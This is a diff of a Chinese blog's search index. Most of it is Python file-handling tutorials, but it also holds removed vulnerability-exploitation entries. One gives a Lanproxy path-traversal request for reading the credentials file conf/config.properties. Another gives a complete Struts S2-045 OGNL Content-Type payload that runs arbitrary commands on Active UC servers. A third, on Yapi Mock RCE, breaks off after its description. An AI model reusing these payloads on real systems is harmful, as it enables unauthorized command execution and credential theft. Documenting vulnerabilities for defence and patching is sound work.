+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件写入</span></span><br><span class="line"><span class="comment"># 如果不指定操作类型，则默认是 读取文件 ， 而读取文件时是不能向文件中写入的</span></span><br><span class="line">name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># write()来向文件中写入内容，不会自动换行</span></span><br><span class="line">    <span class="comment"># 如果操作的是一个文本文件的话，则write()需要传递一个字符串作为参数</span></span><br><span class="line">    <span class="comment"># 该方法会可以分多次向文件中写入内容</span></span><br><span class="line">    <span class="comment"># 写入完成以后，该方法会返回写入的字符的个数</span></span><br><span class="line">	file.write(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">	r = file.write(<span class="built_in">str</span>(<span class="number">123</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p>二进制文件<br>所有文件分为文本文件和二进制文件<br>读取模式<br>t 读取文本文件（默认值）<br>b 读取二进制文件<br>读取文本文件时，size是以字符为单位的<br>读取二进制文件时，size是以字节为单位</p>
+<p>rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&quot;xxx/xxx.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line">    new_name = <span class="string">&quot;new.jpg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(new_name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> new_obj:</span><br><span class="line">        chunk = <span class="number">1024</span> * <span class="number">100</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = file_obj.read(chunk)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            new_obj.write(content)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="检查文件是否存在"><a href="#检查文件是否存在" class="headerlink" title="检查文件是否存在"></a>检查文件是否存在</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name) <span class="keyword">as</span> file_obj :</span><br><span class="line">        <span class="built_in">print</span>(file_obj.read())</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 文件不存在~~&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">path = os.listdir()</span><br><span class="line"><span class="comment"># os.listdir()获取指定目录的结构，默认获取当前路径，返回一个列表</span></span><br><span class="line">path1 = os.getcwd()</span><br><span class="line"><span class="comment"># os.getcwd()获取当前所在的路径</span></span><br><span class="line">os.chdir(<span class="string">&quot;c:\\xxx\\xxx&quot;</span>)</span><br><span class="line"><span class="comment"># os.chdir(&quot;c:\\&quot;&quot;)修改当前路径为xxx</span></span><br><span class="line">pprint.pprint(path1)</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下创建一个目录</span></span><br><span class="line">os.rmdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除一个目录</span></span><br><span class="line">os.remove(<span class="string">&quot;xxx.txt&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除文件</span></span><br><span class="line">os.rename(<span class="string">&quot;旧名字&quot;</span>,<span class="string">&quot;新名字&quot;</span>)</span><br><span class="line"><span class="comment"># 对文件重命名</span></span><br><span class="line">os.rename(<span class="string">&quot;文件名&quot;</span>,<span class="string">&quot;路径/文件名&quot;</span>)</span><br><span class="line"><span class="comment"># 也可以用来移动文件</span></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>Python3</category>
@@ -1276,147 +1417,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-文件与目录</title>
-    <url>//0571043783b3.html</url>
-    <content><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>通过python程序对计算机中的各种文件进行增删改查等操作</p>
-<p>I/O (input/output)</p>
-<p>在windows系统使用路径时，可以使用<code>/</code>来代替 <code>\</code><br>或者可以使用 <code>\\ </code>来代替 <code>\</code><br>或者也可以使用原始字符串<code> r&#39;xxx&#39;</code><br>表示路径，可以使用<code>..</code>来返回一级目录</p>
-<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>, encoding_=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br><span class="line">参数：</span><br><span class="line">	<span class="built_in">open</span>(file) 要打开的文件的名字（路径）</span><br><span class="line">返回值：</span><br><span class="line">	返回一个对象，这个对象就代表了当前打开的文件</span><br><span class="line">    </span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line"><span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with...as 语句</span></span><br><span class="line"><span class="comment"># 通过with语句，在处理文件时，不论是否抛出异常，都可以保证关闭已经打开的文件</span></span><br><span class="line"><span class="comment"># as后跟自定义变量</span></span><br><span class="line"><span class="comment"># 在with语句中可以直接使用file_obj来做文件操作</span></span><br><span class="line"><span class="comment"># 这个文件只能在with中使用，一旦with结束则文件会自动close()</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(file.read())</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用open()来打开一个文件，可以将文件分成两种类型</span></span><br><span class="line"><span class="comment"># 一种，是纯文本文件（使用utf-8等编码编写的文本文件）</span></span><br><span class="line"><span class="comment"># 一种，是二进制文件（图片、mp3、ppt等这些文件）</span></span><br><span class="line"><span class="comment"># open()打开文件时，默认是以文本文件的形式打开的，但是open()默认的编码为None</span></span><br><span class="line"><span class="comment"># encodint可以设置指定文件的编码</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="built_in">print</span>(file.read())</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line">b = file.read()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件</span></span><br><span class="line"><span class="comment"># 如果要读取的文件较大的话，会一次性将文件的内容加载到内存中，容易导致内存泄漏</span></span><br><span class="line"><span class="comment"># 所以不能直接调用read()</span></span><br><span class="line"><span class="comment"># read()可以接收一个size作为参数，该参数用来指定要读取的字符的数量</span></span><br><span class="line"><span class="comment">#   默认值为-1，它会读取文件中的所有字符</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		content = file_obj.read(-<span class="number">1</span>)</span><br><span class="line">		content = file_obj.read(<span class="number">20</span>)</span><br><span class="line">		<span class="built_in">print</span>(content)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件方法二</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="comment"># 定义一个变量，来保存文件的内容</span></span><br><span class="line">        file_content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			content = file_obj.read(<span class="number">100</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="comment"># print(content,end=&#x27;&#x27;)</span></span><br><span class="line">			<span class="comment"># 利用拼串的方式分块读取内容</span></span><br><span class="line">			file_content += content</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file_content)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h2><p>readline() 该方法可以用来读取一行内容<br>readlines()    该方法用于一行一行读取内容，会一次性把读取到的内容封装到列表中</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pprint <span class="comment"># 当字符超过80字节时，用来美化输出</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="built_in">print</span>(file.readline(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment"># r = file.readlines()</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r)</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r[1])</span></span><br><span class="line"><span class="comment"># for循环也可以一行行读取数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="tell"><a href="#tell" class="headerlink" title="tell()"></a>tell()</h2><p><code>tell()</code>方法用来查看当前读取位置</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="seek"><a href="#seek" class="headerlink" title="seek()"></a>seek()</h2><p><code>seek()</code>用来修改当前读取的位</p>
-<p><code>seek()</code>需要两个参数，第一个是要切换到的位置，第二个是计算位置方式</p>
-<p>可选值：</p>
-<ul>
-<li>0： 从头计算，默认值</li>
-<li>1：从当前位置计算</li>
-<li>2：从最后位置开始计算</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># 使用seek(x,2)的时候，用r+可能导致报错，推荐使用rb</span></span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>)</span><br><span class="line">    <span class="comment"># 修改当前读取的位置为50字节</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 从50个字节起读取50个字节</span></span><br><span class="line">    file_obj.seek(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个之后的,会什么都读取不到</span></span><br><span class="line">    file_obj.seek(-<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个字节</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前读取的位置是:&#x27;</span>,file_obj.tell())</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><table>
-<thead>
-<tr>
-<th align="center">参数</th>
-<th align="center">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">t</td>
-<td align="center">文本模式（默认）</td>
-</tr>
-<tr>
-<td align="center">x</td>
-<td align="center">写模式，新建文件，如果该文件存在则报错</td>
-</tr>
-<tr>
-<td align="center">b</td>
-<td align="center">二进制模式</td>
-</tr>
-<tr>
-<td align="center">+</td>
-<td align="center">打开一个文件（可读可写）</td>
-</tr>
-<tr>
-<td align="center">U</td>
-<td align="center">通用换行模式（不推荐）</td>
-</tr>
-<tr>
-<td align="center">r</td>
-<td align="center">以只读方式打开文件（默认），文件不存在则报错</td>
-</tr>
-<tr>
-<td align="center">rb</td>
-<td align="center">以只读方式打开二进制文件（默认）</td>
-</tr>
-<tr>
-<td align="center">r+</td>
-<td align="center">以读写的方式打开一个文件</td>
-</tr>
-<tr>
-<td align="center">rb+</td>
-<td align="center">以读写的方式打开一个二进制文件</td>
-</tr>
-<tr>
-<td align="center">w</td>
-<td align="center">以只写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">wb</td>
-<td align="center">以只写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">w+</td>
-<td align="center">以读写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">wb+</td>
-<td align="center">以读写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">a</td>
-<td align="center">以追加的方式写入一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">ab</td>
-<td align="center">以追加的方式写入一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">a+</td>
-<td align="center">以追加的方式读写一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
-</tr>
-<tr>
-<td align="center">ab+</td>
-<td align="center">以追加的方式读写一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
-</tr>
-</tbody></table>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件写入</span></span><br><span class="line"><span class="comment"># 如果不指定操作类型，则默认是 读取文件 ， 而读取文件时是不能向文件中写入的</span></span><br><span class="line">name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># write()来向文件中写入内容，不会自动换行</span></span><br><span class="line">    <span class="comment"># 如果操作的是一个文本文件的话，则write()需要传递一个字符串作为参数</span></span><br><span class="line">    <span class="comment"># 该方法会可以分多次向文件中写入内容</span></span><br><span class="line">    <span class="comment"># 写入完成以后，该方法会返回写入的字符的个数</span></span><br><span class="line">	file.write(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">	r = file.write(<span class="built_in">str</span>(<span class="number">123</span>))</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p>二进制文件<br>所有文件分为文本文件和二进制文件<br>读取模式<br>t 读取文本文件（默认值）<br>b 读取二进制文件<br>读取文本文件时，size是以字符为单位的<br>读取二进制文件时，size是以字节为单位</p>
-<p>rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&quot;xxx/xxx.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line">    new_name = <span class="string">&quot;new.jpg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(new_name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> new_obj:</span><br><span class="line">        chunk = <span class="number">1024</span> * <span class="number">100</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = file_obj.read(chunk)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            new_obj.write(content)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="检查文件是否存在"><a href="#检查文件是否存在" class="headerlink" title="检查文件是否存在"></a>检查文件是否存在</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name) <span class="keyword">as</span> file_obj :</span><br><span class="line">        <span class="built_in">print</span>(file_obj.read())</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 文件不存在~~&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">path = os.listdir()</span><br><span class="line"><span class="comment"># os.listdir()获取指定目录的结构，默认获取当前路径，返回一个列表</span></span><br><span class="line">path1 = os.getcwd()</span><br><span class="line"><span class="comment"># os.getcwd()获取当前所在的路径</span></span><br><span class="line">os.chdir(<span class="string">&quot;c:\\xxx\\xxx&quot;</span>)</span><br><span class="line"><span class="comment"># os.chdir(&quot;c:\\&quot;&quot;)修改当前路径为xxx</span></span><br><span class="line">pprint.pprint(path1)</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下创建一个目录</span></span><br><span class="line">os.rmdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除一个目录</span></span><br><span class="line">os.remove(<span class="string">&quot;xxx.txt&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除文件</span></span><br><span class="line">os.rename(<span class="string">&quot;旧名字&quot;</span>,<span class="string">&quot;新名字&quot;</span>)</span><br><span class="line"><span class="comment"># 对文件重命名</span></span><br><span class="line">os.rename(<span class="string">&quot;文件名&quot;</span>,<span class="string">&quot;路径/文件名&quot;</span>)</span><br><span class="line"><span class="comment"># 也可以用来移动文件</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3-流程控制语句</title>
     <url>//3e612c0e2f45.html</url>
     <content><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--<span class="keyword">if</span>语句</span><br><span class="line">语法：</span><br><span class="line">	<span class="keyword">if</span> 条件表达式 :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">elif</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">    	代码块</span><br><span class="line">    	</span><br><span class="line">代码块 条件表达式 代码块</span><br><span class="line">r = a <span class="keyword">if</span> a &gt; b <span class="keyword">else</span> r = b</span><br></pre></td></tr></table></figure>
@@ -1542,109 +1542,6 @@
       </categories>
       <tags>
         <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Lanproxy任意文件读取-CVE-2021-3019</title>
-    <url>//0e7fcf3b35d4.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
-<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">header&#x3D; &quot;Server: LPS-0.1&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://file.nioee.com/d/2e81550ebdbd416c933f/">https://file.nioee.com/d/2e81550ebdbd416c933f/</a></p>
-<p>只下载服务端<a href="https://file.nioee.com/d/2e81550ebdbd416c933f/files/?p=/proxy-server-0.1.zip">proxy-server-0.1.zip</a></p>
-<p>配置文件地址</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;conf&#x2F;config.properties</span><br></pre></td></tr></table></figure>
-
-<p>启动服务</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;bin&#x2F;startup.bat</span><br><span class="line">..&#x2F;bin&#x2F;startup.sh</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问服务页面管理地址</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8090</span><br></pre></td></tr></table></figure>
-
-<p>当前页面抓包，访问路径<code>../conf/config.properties</code>(直接访问会报404错)</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5vkomujlj611f0badlf02.jpg" alt="Lanproxy目录遍历漏洞.png"></p>
-<h3 id="POC下载"><a href="#POC下载" class="headerlink" title="POC下载"></a>POC下载</h3><p><a href="https://github.com/FanqXu/CVE-2021-3019">https://github.com/FanqXu/CVE-2021-3019</a></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>下载官方补丁</p>
-<p><a href="https://github.com/ffay/lanproxy/commits/master">https://github.com/ffay/lanproxy/commits/master</a></p>
-<p><a href="https://github.com/hailinz/lanproxy">https://github.com/hailinz/lanproxy</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web应用漏洞</category>
-        <category>Lanproxy</category>
-      </categories>
-      <tags>
-        <tag>信息泄露</tag>
-        <tag>目录遍历</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Active UC index.action远程命令执行漏洞</title>
-    <url>//20f03e999316.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令</p>
-<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title&#x3D;&quot;网动统一通信平台(Active UC)&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>访问如下路径</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;acenter&#x2F;index.action</span><br></pre></td></tr></table></figure>
-
-<p>抓取http请求，修改<code>Content-Type</code>的值为我们构造好的命令执行语句</p>
-<p>以下代码中<code>(#cmd=&#39;netstat -an&#39; )</code>的<code>netstat -an</code>是我们执行的命令，可以根据实际环境修改</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;acenter&#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: xx.xx.xx.xx:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;89.0.4389.90 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: %&#123;(#_&#x3D;&#39;multipart&#x2F;form-data&#39;).(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#dm):((#container&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil&#x3D;#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd&#x3D;&#39;netstat -an&#39; ).(#iswin&#x3D;(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds&#x3D;(#iswin?&#123;&#39;cmd.exe&#39;,&#39;&#x2F;c&#39;,#cmd&#125;:&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,#cmd&#125;)).(#p&#x3D;new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process&#x3D;#p.start()).(#ros&#x3D;(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gt5yntnvkjj616g0exqcm02.jpg" alt="Active UC index.action远程命令执行漏洞.png"></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>对<code>Content-Type</code>的值进行检查，对有特征的恶意数据进行过滤</p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web应用漏洞</category>
-        <category>Active-UC</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Yapi Mock远程代码执行漏洞</title>
-    <url>//8cd1c56722a1.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
